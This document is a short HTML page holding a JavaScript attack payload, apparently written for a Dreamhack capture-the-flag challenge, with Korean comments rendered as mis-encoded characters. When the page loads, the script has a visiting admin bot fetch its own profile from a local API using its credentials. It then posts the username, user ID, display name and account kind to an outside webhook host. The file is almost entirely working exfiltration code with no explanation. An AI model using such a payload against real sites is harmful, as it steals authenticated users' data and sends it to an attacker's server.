<!-- ë‹¹ì‹ ì˜ atk.html í˜ì´ì§€ì—ì„œ -->
<script>
async function getAdminInfo() {
    try {
        // Admin ë´‡ì´ ë°©ë¬¸í–ˆì„ ë•Œ ìì‹ ì˜ í”„ë¡œí•„ ì •ë³´ ìˆ˜ì§‘
        const profileResp = await fetch('http://127.0.0.1:5555/api/profile', {
            credentials: 'include'
        });
        
        if (profileResp.ok) {
            const adminProfile = await profileResp.json();
            
            // Webhookìœ¼ë¡œ Admin ì •ë³´ ì „ì†¡
            const adminInfo = {
                admin_username: adminProfile.username,
                admin_user_id: adminProfile.user_id,
                admin_display_name: adminProfile.display_name,  // ğŸ¯ ì´ê²ƒ!
                admin_user_kind: adminProfile.user_kind
            };
            
            await fetch('https://atefpeg.request.dreamhack.games', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'admin_info_extracted',
                    data: adminInfo
                }),
                mode: 'no-cors'
            });
        }
    } catch (e) {
        console.log('Failed to get admin info:', e);
    }
}

// í˜ì´ì§€ ë¡œë“œ ì‹œ ì‹¤í–‰
window.onload = getAdminInfo;
</script>
